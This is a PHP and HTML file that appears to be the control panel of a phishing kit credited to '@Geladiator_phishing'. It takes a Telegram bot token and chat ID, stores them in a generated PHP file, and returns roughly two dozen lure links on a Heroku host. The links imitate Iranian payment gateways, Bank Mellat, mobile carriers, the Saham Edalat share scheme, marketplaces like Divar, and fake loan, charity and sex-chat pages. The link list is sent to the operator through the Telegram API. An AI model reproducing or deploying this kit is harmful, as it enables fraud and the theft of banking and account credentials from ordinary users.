<?php

//ANTY SPAME
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}



$TOKEN=strlen($_POST["TOKEN"]);

$ID=strlen($_POST["ID"]);


If ($TOKEN==45||$TOKEN==46||$TOKEN==47||$TOKEN==48||$TOKEN==49){
	$show="OK" ;
	
$show="! Success Full" ;
$font="00FF00";

$T = stripslashes(htmlspecialchars($_POST["TOKEN"]));
$IDS=intval(stripslashes(htmlspecialchars($_POST["ID"])));

//LINK

$url="https://asdfghjklfgh.herokuapp.com/";

file_put_contents("ID.txt",$IDS);
 
$IP=$_SERVER["REMOTE_ADDR"];
$Domain=$_SERVER["HTTP_HOST"];
$O=rand(1000,9000);
if(!file_exists("data")){mkdir("data");}
$xkiler = fopen("data/$O.php", 'w') or die("Kos Nanat!");
fwrite($xkiler, "<?php\n");
fwrite($xkiler, "$");
fwrite($xkiler, "TOKEN='$T';\n");
fwrite($xkiler, "$");
fwrite($xkiler, "ID= $IDS;\n");
fwrite($xkiler, "?>");


$Asan="$url/Asan/?e=$O";
$Live="$url/Live/?e=$O";
$Sighe="$url/Sighe/?e=$O";
$Irancell="$url/Irancell/?e=$O";
$Dostyabi="$url/Dostyabi/?e=$O";
$Masaj="$url/Masaj/?e=$O"; 
$Mobo="$url/Mobo/?e=$O";
$Charge="$url/Charge/?e=$O" ;
$Vam="$url/Vam/?e=$O";
$Mci="$url/Mci/?e=$O" ;
$Chat="$url/Chat/?e=$O";
$net6="$url/Net/?e=$O";
$Internet="$url/Internet/?e=$O" ;
$Hamta="$url/Hamta/?e=$O" ;
$Kheyrieh="$url/Kheyrieh/?e=$O" ;
$Internetmeli="$url/Internetmeli/?e=$O" ;
$Saham="$url/Saham/?e=$O" ;
$Freefolower="$url/Freefolower/?e=$O";
$Mellat= "$url/Mellat/?e=$O" ;
$Folower="$url/Folower/?e=$O";
$Filimo="$url/Filimo/?e=$O";
$Divar="$url/Divar/?e=$O" ;
$sheypoor="$url/sheypoor/?e=$O" ;
$book="$url/Ketab/?e=$O" ;


        $Text="
        
        ╔═ [𝚈𝚘𝚞𝚛 𝚕𝚒𝚗𝚔𝚜!] ════╣⫸
╟ ✳️ Name :  Asan (آسان پرداخت) 
║ $Asan
╠═══════════════╣⫸
╟ ✳️ Name : Mellat (به پرداخت)
║ $Mellat
╠═══════════════╣⫸
╟ ✳️ Name :Charge(شارژ جدید)
║ $Charge
╠═══════════════╣⫸
╟ ✳️ Name : Net ( نت )
║ $net6
╠═══════════════╣⫸
╟ ✳️ Name : Vam (وام یک ملیونی)
║ $Vam
╠═══════════════╣⫸
╟ ✳️ Name : Mci (ام سی ای)
║ $Mci
╠═══════════════╣⫸
╟ ✳️ Name : Sex Chat(سکس چت)
║ $Chat
╠═══════════════╣⫸
╟ ✳️ Name : Live sexi (لایو سکسی)
║ $Live
╠═══════════════╣⫸
╟ ✳️ Name : Sighe (صیغه)
║ $Sighe
╠═══════════════╣⫸
╟ ✳️ Name : Iranccel (نت ایرانسل)
║ $Irancell
╠═══════════════╣⫸
╟ ✳️ Name : Netnew (نت جدید ) 
║ $Internet
╠═══════════════╣⫸
╟ ✳️ Name : Mobo (موبوشارژ) 
║ $Mobo
╠═══════════════╣⫸
╟ ✳️ Name : Help (کمک به بیماران) 
║ $Kheyrieh
╠═══════════════╣⫸
╟ ✳️ Name : Hamta (سامانه همتا) 
║ $Hamta
╠═══════════════╣⫸
╟ ✳️ Name : Netmeli (اینترنت ملی) 
║ $Internetmeli
╠═══════════════╣⫸
╟ ✳️ Name : Saham (سهام عدالت) 
║ $Saham
╠═══════════════╣⫸
╟ ✳️ Name : Folower ( خرید فالور) 
║ $Folower
╠═══════════════╣⫸
╟ ✳️ Name : Folower ( خرید اشتراک فیلمو) 
║ $Filimo
╠═══════════════╣⫸
╟ ✳️ Name : Divar  ( دیوار ) 
║ $Divar
╠═══════════════╣⫸
╟ ✳️ Name : Insta (فیک پیچ ) 
║ $Freefolower
╠═══════════════╣⫸
╟ ✳️ Name : Masaj (رزو ماساژور)
║ $Masaj
╠═══════════════╣⫸
╟ ✳️ Name : sheypoor (شیپور)
║ $sheypoor
╠═══════════════╣⫸
╟ ✳️ Name : book (فروش کتاب)
║$book
║
╠═[𝚈𝚘𝚞𝚛 𝙸𝙿]═╣⫸
╟ 🌐𝙸𝙿 <code>$IP</code>
╠═══[𝙻𝚒𝚗𝚔]══╣⫸
╟ ♻️ WEB LINK
║ $url
╠══[𝙿𝚘𝚛𝚝]═══╣⫸
╟ 🔢YOR  CODE <code>$O</code>
║ 
╠════════[𝙲𝚛𝚎𝚊𝚝𝚘𝚛] ════╣⫸
╟ ✨Cʀᴇᴀᴛᴇᴅ Bʏ : @Geladiator_phishing 
║ 
╠═══[𝙲𝚑𝚊𝚗𝚗𝚎𝚕𝚝𝚎𝚕]═══════╣⫸
╟ 🆔 @Geladiator_phishing 
║ 
╚══════  [𝙶𝚘𝚘𝚍 𝚕𝚞𝚌𝚔!] ════╣⫸
";
        

        $report =  file_get_contents("https://api.telegram.org/bot".$T."/SendMessage?chat_id=".$IDS."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($Text));

$chat= file_get_contents("ID.txt");
$yo="your chat id: " ;

} else{
	$token="! Robot tokens are required " ;
$font="FF0000";

} 
if($ID ==8||$ID ==9||$ID ==10||$ID ==11||$ID ==12){
	
	$fonts="00FF00";


}
else{

	$id="! Numeric ID is required" ;
	$fonts="FF0000";
	} 
	
	
	?>
	

<!DOCTYPE html>
<html lang="fa" xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Geladiator </title><meta charset="utf-8" />
<meta name="generator" content="Geladiator" />
<meta name="author" content="Geladiator" />
<meta name="robot" content="noindex,follow" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<link type="text/css" rel="stylesheet" href="css/StyleSheet.css" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
function showpayment(str) {
if (str.length == 0) {
document.getElementById("request").innerHTML = "";
return;} 
else {var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("request").innerHTML = this.responseText;}};
xmlhttp.open("post", "xkiler.php");
xmlhttp.send();}}
</script><script>
var div = 'alert';
var loadingmessage = '';
function Ajaxrequest(){
var xmlHttp;
try{
xmlHttp=new XMLHttpRequest();
return xmlHttp;}
catch (e){
try{xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");
return xmlHttp;}
catch (e){
try{xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
return xmlHttp;}
catch (e){
alert("لطفا مرورگر خود را آپدیت نمایید");
return false;}}}}
function formget(form, url) {
var poststr = getFormValues(form);
postData(url, poststr);}
function postData(url, parameters){
var xmlHttp = Ajaxrequest();
xmlHttp.onreadystatechange =  function(){
if(xmlHttp.readyState > 0 && xmlHttp.readyState < 4){
document.getElementById(div).innerHTML=loadingmessage;}
if (xmlHttp.readyState == 4) {
document.getElementById(div).innerHTML=xmlHttp.responseText;}}
xmlHttp.open("POST", "xkiler.php");
xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xmlHttp.send(parameters);}
function getFormValues(formobj){
var str = "";
var valueArr = null;
var val = "";
var cmd = "";
for(var i = 0;i < formobj.elements.length;i++){
switch(formobj.elements[i].type){

case "text":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "tel":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "email":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "password":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "url":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "textarea":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "select-one":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "hidden":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "checkbox":
if(formobj.elements[i].checked == true){str += formobj.elements[i].name + "=" + formobj.elements[i].value + "&";}
break;

}}
str = str.substr(0,(str.length - 1));
return str;}
</script></head><body>
<div class="box animated zoomIn">
<form method="post" action="#" autocomplete="off">


       
	   
	   <p><font color="#<?php echo $font;?>"><?php echo $show;?></font></p>
           <p><font color="#<?php echo $font;?>"><?php echo $yo,$chat;?></font></p>

</form></div>
	

<div id="alert"></div>

</body>
</html>


